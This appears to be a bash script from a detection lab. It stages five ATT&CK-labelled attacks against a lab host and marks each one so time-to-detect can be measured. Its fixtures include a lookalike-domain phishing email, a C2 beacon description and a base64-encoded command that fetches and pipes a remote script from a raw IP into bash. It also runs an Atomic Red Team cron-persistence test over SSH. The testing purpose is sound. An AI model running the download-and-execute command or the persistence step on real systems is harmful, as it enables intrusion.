#!/bin/bash
# BASELINE / WARNING timed run: fire all 5 attacks IN ORDER, spaced out,
# and MARK each one (so report_mttd.py can measure MTTD).
# Run in T2 (agent host) WHILE the scheduler runs in T1.
set -u

VICTIM_IP="10.10.10.30"
VICTIM_USER="ted"
GAP=30          # seconds between attacks (>= poll interval so each lands in its own cycle)

echo "=== firing 5 attacks (marked), ${GAP}s apart ==="

echo "[1/5] Recon (T1046)"
ssh -n ${VICTIM_USER}@${VICTIM_IP} "sudo systemctl start vsftpd" 2>/dev/null
python mark_attack.py --technique T1046 --target ${VICTIM_IP} --note "auto recon"
sleep $GAP

echo "[2/5] Delivery (T1566.002)"
cat > emails/${VICTIM_IP}.txt <<'EOF'
From: it-support@paypa1-secure.com
Subject: URGENT: Verify your account or it will be suspended

Dear user, your account access is suspended. Click here to verify your
identity within 24 hours: http://bit.ly/3xAmpleLink
EOF
python mark_attack.py --technique T1566.002 --target ${VICTIM_IP} --note "auto phishing"
sleep $GAP

echo "[3/5] Exploitation (T1027)"
cat > commands/${VICTIM_IP}.txt <<'EOF'
echo ZWNobyAiaGkiOyBjdXJsIC1zIGh0dHA6Ly80NS4zMy4xMi45L3guc2ggfCBiYXNo | base64 -d | bash
EOF
python mark_attack.py --technique T1027 --target ${VICTIM_IP} --note "auto base64"
sleep $GAP

echo "[4/5] Installation (T1053.003)"
ssh -n ${VICTIM_USER}@${VICTIM_IP} "pwsh -Command \"Import-Module invoke-atomicredteam; Invoke-AtomicTest T1053.003 -TestNumbers 1\"" 2>/dev/null
python mark_attack.py --technique T1053.003 --target ${VICTIM_IP} --note "auto cron"
sleep $GAP

echo "[5/5] C2 (T1071.001)"
cat > connections/${VICTIM_IP}.txt <<'EOF'
Observed outbound network activity from host 10.10.10.30:

Destination 45.33.12.9:8443 (raw IP, HTTPS port), connection repeats every
60 seconds +/- 2s with near-perfect regularity over the last 30 minutes.
Each request sends 128 bytes out and receives 96 bytes in - consistent tiny
payloads with no variation. No browser process is associated with the
traffic. User-Agent string observed: "HttpBrowser/1.0". No DNS lookup
precedes the connections; the raw IP is contacted directly.

Also present: one normal SSH session on port 22 to 10.10.10.20.
EOF
python mark_attack.py --technique T1071.001 --target ${VICTIM_IP} --note "auto beacon"

echo ""
echo "=== all 5 fired + marked. Let scheduler run ~2 more cycles, Ctrl+C it, then: ==="
echo "  python report_mttd.py --window 900 | tee mttd_RUN.txt"
echo "  python format_report.py --host ${VICTIM_IP} | tee analysis_RUN.txt"
